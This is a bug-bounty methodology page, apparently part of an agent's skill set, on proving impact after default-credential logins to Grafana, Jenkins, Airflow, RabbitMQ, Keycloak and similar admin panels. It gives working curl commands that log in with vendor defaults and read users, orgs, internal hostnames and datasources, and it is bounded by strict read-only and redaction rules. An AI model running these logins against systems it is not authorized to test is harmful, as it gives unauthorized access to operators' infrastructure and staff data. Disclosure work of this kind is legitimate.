# Post-login proof — read real admin data, change nothing, stop

A successful default login is **not** the finding. Card 04's converting report is
the one where the login was followed by a read: uipath Grafana #3701766 returned
the full SRE infrastructure inventory and 14 user accounts, and that content is
what got it triaged. A report that says "the credential worked" and stops there
reads as a configuration observation and lands next to the version-banner
submissions that closed N/A.

So the sequence is fixed: **log in once (rung 2) → make two or three read-only
calls (rung 3) → capture the negative control → stop.**

## Two rules that bound everything on this page

**1. Never change the password — even when the panel demands it.** Grafana and
several others answer a successful default login with an "update your password"
prompt. That prompt is the **oracle**: being asked to change the credential
proves the credential is *still* the vendor default. Screenshot it, quote the
text, and skip the change. Changing it is rung 5, it locks the operator out of
their own panel, it destroys your evidence, and it converts a triaged finding
into an incident.

**2. Read-only means read-only.** No user creation, no dashboard save, no job or
DAG trigger, no queue purge, no KV write, no admin initialization, no export job.
Two or three `GET`s, then out. If the impact genuinely needs a write, that is
rung 5 — not attempted: ask d0x directly with the exact request before executing.

## The proof set per product

Each block is the minimum that shows **real administrative data**. Take the first
two or three that answer; you do not need all of them.

### Grafana

```bash
curl -s -c graf.jar -o /dev/null -X POST "$H/login" \
  -H 'Content-Type: application/json' -d '{"user":"admin","password":"admin"}'

curl -s -b graf.jar "$H/api/admin/stats" | jq -c .
# {"users":14,"admins":3,"editors":6,"viewers":5,"orgs":4,"dashboards":212,
#  "datasources":19,"alerts":88,"stars":31,"playlists":2,"snapshots":7}

curl -s -b graf.jar "$H/api/orgs" | jq -c .
# [{"id":1,"name":"Main Org."},{"id":2,"name":"sre-prod"},{"id":3,"name":"payments-staging"}]

curl -s -b graf.jar "$H/api/org/users" | jq -c '.[]|{login,email,role}'
# {"login":"admin","email":"admin@localhost","role":"Admin"}
# {"login":"sre.lead","email":"sre.lead@corp.example","role":"Admin"}
```

`/api/admin/stats`, `/api/orgs` and `/api/org/users` are card 04's own named
proof set — keep them. One optional fourth call carries the most weight in the
report because it turns a monitoring panel into an infrastructure map:

```bash
curl -s -b graf.jar "$H/api/datasources" | jq -c '.[]|{name,type,url,basicAuthUser}'
# {"name":"prod-prometheus","type":"prometheus","url":"http://prom.internal:9090",
#  "basicAuthUser":"grafana"}
```

Internal hostnames, ports and datasource service accounts. If a datasource is a
cloud backend (CloudWatch, Azure Monitor, Stackdriver) its stored credential is a
cloud credential — hand to `../../cloud-exploitation/SKILL.md`. Do **not** call
`/api/datasources/proxy/<id>/…`; that makes the panel issue requests to internal
hosts on your behalf, which is SSRF-by-design and a separate, higher-risk action.

### Jenkins (anonymous, no credential)

```bash
curl -s "$H/whoAmI/api/json" | jq -c .
# {"authenticated":true,"authorities":["authenticated"],"name":"admin"}
curl -s "$H/api/json" | jq -c '{mode, useSecurity, jobs:[.jobs[].name]}'
# {"mode":"NORMAL","useSecurity":true,"jobs":["deploy-prod"]}
```

Job names alone establish it. Stop before build logs — they routinely contain
live tokens, which is `exposed-secrets` territory and needs the handoff, not a
bulk read. **Never POST to `/script`**; a rendered Groovy console is the proof
that it is reachable, and execution belongs to `rce-hunting`.

### Airflow

```bash
curl -s -u airflow:airflow "$H/api/v1/dags" | jq -c '{total_entries, first:.dags[0].dag_id}'
# {"total_entries":47,"first":"etl_customer_pii"}
```

DAG count plus one DAG id names the data pipelines. Do not call
`/api/v1/dags/{id}/dagRuns` with `POST` — triggering a DAG is a rung-5 write that
moves production data. Airflow **connections** (`/api/v1/connections`) hold
credentials; that is `exposed-secrets`.

### RabbitMQ

```bash
curl -s -u guest:guest "$H/api/overview" | jq -c '{rabbitmq_version, object_totals}'
# {"rabbitmq_version":"3.11.5","object_totals":{"queues":214,"connections":88,"consumers":130}}
curl -s -u guest:guest "$H/api/vhosts" | jq -c '.[]|{name,messages}'
# {"name":"/","messages":1204}   {"name":"payments","messages":88}
```

Queue and vhost names describe the estate. **Never** call `/api/queues/<vhost>/<q>/get`
— consuming messages destroys them and exposes third-party payloads.

### Keycloak

```bash
T=$(curl -s -X POST "$H/realms/master/protocol/openid-connect/token" \
  -d 'client_id=admin-cli' -d 'grant_type=password' \
  -d 'username=admin' -d 'password=admin' | jq -r '.access_token')
curl -s -H "Authorization: Bearer $T" "$H/admin/realms" | jq -r '.[].realm'
```

The realm list proves the token is administrative. Stop there — `/users` is
directory PII (rung 3 on real people); take a `?briefRepresentation=true&max=1`
count at most, or do the full read on UAT per rung 4.

### Zabbix / Nagios / MinIO / Portainer

- **Zabbix**: after login, `host.get` with the session returns the monitored host
  inventory. The count plus two host names is the proof; do not pull the estate.
- **Nagios**: the authenticated `/nagios/` landing page carries the version banner
  and the monitored host/service summary. A single page fetch is the proof.
- **MinIO**: list **buckets only** (`mc ls` equivalent / console bucket list).
  Do **not** download objects — bucket contents are third-party data.
- **Portainer**: with an existing admin you have nothing to log into. The proof
  is the `404` on `/api/users/admin/check` (uninitialized) plus `/api/system/status`.
  Do not init.

### Spring Boot / Consul / Prometheus / Elasticsearch

These have no login, so there is no rung 2 — the unauthenticated read *is* the
finding, and it is a **data exposure**, not a credential bug. Take the single
confirming read (`/actuator/env` key names, `/v1/catalog/services`,
`/api/v1/targets`, `_cat/indices` counts) and hand it straight to
`../../exposed-secrets/SKILL.md`. Do not write it up here.

## The negative control (do not skip it)

Every proof needs the same call **without** the session, in the same capture:

```bash
curl -s -o /dev/null -w 'no-session -> %{http_code}\n' "$H/api/admin/stats"
# no-session -> 401
```

Plus the wrong-password attempt from `default-creds.md`
(`401 {"message": "Invalid username or password"}`). Together these prove the
panel does enforce a credential boundary and that the **published default** is
what crossed it — which is precisely the sentence a triager needs, and the
sentence that separates this from "the panel was open".

## What to keep, and what to redact

| Keep verbatim in the report | Redact, keep only the shape |
|---|---|
| Counts: `"users": 14`, `"datasources": 19`, `"total_entries": 47`, queue depths | Session cookie/token values — `grafana_session=<redacted, len=32>` |
| Org / realm / vhost / DAG / job / bucket names | Staff email local-parts if the program is strict — keep the domain, it proves they are internal |
| Internal hostnames and ports from datasource and target configs | Any secret the panel displays — record it in `notes/`, flag it for rotation |
| The "update your password" prompt text | Message bodies, object contents, build-log bodies |

Raw responses live in `targets/<program>/notes/`; the lead and the report carry
the redacted form and cite the note path — see
`../../_shared/references/output-contract.md`.

## Close the loop

- Restate explicitly that nothing was created, modified or deleted, and that the
  password was **deliberately** left unchanged.
- Say prod or staging, and how you know. Staging caps severity (uipath was
  triaged *but low* for exactly this reason) — state it yourself rather than let
  the triager find it.
- Flag every credential the panel exposed for rotation, including the default one.
- Then `validation`, then `report-writing`.
